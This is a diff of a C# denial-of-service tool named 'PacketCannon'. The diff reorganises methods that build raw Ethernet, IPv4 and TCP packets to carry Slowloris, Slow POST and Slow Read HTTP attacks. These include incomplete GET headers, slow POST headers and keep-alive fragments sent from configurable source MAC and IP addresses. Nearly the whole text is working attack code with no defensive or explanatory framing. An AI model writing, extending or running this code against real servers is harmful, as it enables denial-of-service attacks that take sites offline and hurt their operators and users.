@@ -47,7 +47,7 @@ namespace PacketCannon
             //                                 "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42";
             //}
 
-            SlowPostHeader = slowPostHeader + $"Content-Length: {SlowPostContentLength}\r\n\r\n name=";
+            SlowPostHeader = slowPostHeader + $"\r\nContent-Length: {slowPostHeaderContentLength}\r\n\r\n";
             //if (slowPostHeader == null)
             //{
             //    SlowPostHeader = "POST " + "/textform.php" + " HTTP/1.1\r\n" + $"Host: {host}  \r\n" + "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: " + SlowPostContentLength + "\r\n\r\n" + "name=";
@@ -141,7 +141,48 @@ namespace PacketCannon
             _identificatioNumber++;
         }
 
-        public void SendKeepAliveForSlowLoris(PacketCommunicator communicator)
+        public void SendGetNotComplete(PacketCommunicator communicator)
+        {
+            // Ethernet Layer
+            var ethernetLayer = new EthernetLayer
+            {
+                Source = SourceMac,
+                Destination = DestinationMac,
+            };
+
+            // IPv4 Layer
+            var ipV4Layer = new IpV4Layer
+            {
+                Source = SourceIpV4,
+                CurrentDestination = DestinationIpV4,
+                Ttl = 128,
+                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
+                Identification = _identificatioNumber,
+            };
+
+            // TCP Layer
+            var tcpLayer = new TcpLayer
+            {
+                SourcePort = SourcePort,
+                DestinationPort = DestinationPort,
+                SequenceNumber = SeqNumber,
+                AcknowledgmentNumber = AckNumber,
+                ControlBits = (TcpControlBits)24,
+                Window = WindowSize,
+            };
+
+            var httpPayloadLayer = new PayloadLayer()
+            {
+                Data = new Datagram(Encoding.ASCII.GetBytes(SlowLorisHeaderNotComplete))
+            };
+
+            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
+            communicator.SendPacket(packet);
+            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
+            _identificatioNumber++;
+        }
+
+        public void SendSlowLorisKeepAlive(PacketCommunicator communicator)
         {
             // Ethernet Layer
             EthernetLayer ethernetLayer = new EthernetLayer
@@ -182,7 +223,48 @@ namespace PacketCannon
             SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
         }
 
-        public void SendKeepAliveForSlowPost(PacketCommunicator communicator)
+        public void SendSlowPostHeader(PacketCommunicator communicator)
+        {
+            // Ethernet Layer
+            var ethernetLayer = new EthernetLayer
+            {
+                Source = SourceMac,
+                Destination = DestinationMac,
+            };
+
+            // IPv4 Layer
+            var ipV4Layer = new IpV4Layer
+            {
+                Source = SourceIpV4,
+                CurrentDestination = DestinationIpV4,
+                Ttl = 128,
+                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
+                Identification = _identificatioNumber,
+            };
+
+            // TCP Layer
+            var tcpLayer = new TcpLayer
+            {
+                SourcePort = SourcePort,
+                DestinationPort = DestinationPort,
+                SequenceNumber = SeqNumber,
+                AcknowledgmentNumber = AckNumber,
+                ControlBits = (TcpControlBits)24,
+                Window = WindowSize,
+            };
+
+            var httpPayloadLayer = new PayloadLayer()
+            {
+                Data = new Datagram(Encoding.ASCII.GetBytes(SlowPostHeader))
+            };
+
+            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
+            communicator.SendPacket(packet);
+            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
+            _identificatioNumber++;
+        }
+
+        public void SendSlowPostKeepAlive(PacketCommunicator communicator)
         {
             // Ethernet Layer
             EthernetLayer ethernetLayer = new EthernetLayer
@@ -225,48 +307,7 @@ namespace PacketCannon
             SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
         }
 
-        public void SendGetNotComplete(PacketCommunicator communicator)
-        {
-            // Ethernet Layer
-            var ethernetLayer = new EthernetLayer
-            {
-                Source = SourceMac,
-                Destination = DestinationMac,
-            };
-
-            // IPv4 Layer
-            var ipV4Layer = new IpV4Layer
-            {
-                Source = SourceIpV4,
-                CurrentDestination = DestinationIpV4,
-                Ttl = 128,
-                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
-                Identification = _identificatioNumber,
-            };
-
-            // TCP Layer
-            var tcpLayer = new TcpLayer
-            {
-                SourcePort = SourcePort,
-                DestinationPort = DestinationPort,
-                SequenceNumber = SeqNumber,
-                AcknowledgmentNumber = AckNumber,
-                ControlBits = (TcpControlBits)24,
-                Window = WindowSize,
-            };
-
-            var httpPayloadLayer = new PayloadLayer()
-            {
-                Data = new Datagram(Encoding.ASCII.GetBytes(SlowLorisHeaderNotComplete))
-            };
-
-            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
-            communicator.SendPacket(packet);
-            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
-            _identificatioNumber++;
-        }
-
-        public void SendCompleteGetForSlowRead(PacketCommunicator communicator)
+        public void SendSlowReadCompleteGet(PacketCommunicator communicator)
         {
             // Ethernet Layer
             var ethernetLayer = new EthernetLayer
@@ -305,47 +346,6 @@ namespace PacketCannon
             };
 
             var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpRequestLayer);
-            communicator.SendPacket(packet);
-            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
-            _identificatioNumber++;
-        }
-
-        public void SendSlowPostHeader(PacketCommunicator communicator)
-        {
-            // Ethernet Layer
-            var ethernetLayer = new EthernetLayer
-            {
-                Source = SourceMac,
-                Destination = DestinationMac,
-            };
-
-            // IPv4 Layer
-            var ipV4Layer = new IpV4Layer
-            {
-                Source = SourceIpV4,
-                CurrentDestination = DestinationIpV4,
-                Ttl = 128,
-                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
-                Identification = _identificatioNumber,
-            };
-
-            // TCP Layer
-            var tcpLayer = new TcpLayer
-            {
-                SourcePort = SourcePort,
-                DestinationPort = DestinationPort,
-                SequenceNumber = SeqNumber,
-                AcknowledgmentNumber = AckNumber,
-                ControlBits = (TcpControlBits)24,
-                Window = WindowSize,
-            };
-
-            var httpPayloadLayer = new PayloadLayer()
-            {
-                Data = new Datagram(Encoding.ASCII.GetBytes(SlowPostHeader))
-            };
-
-            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
             communicator.SendPacket(packet);
             SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
             _identificatioNumber++;
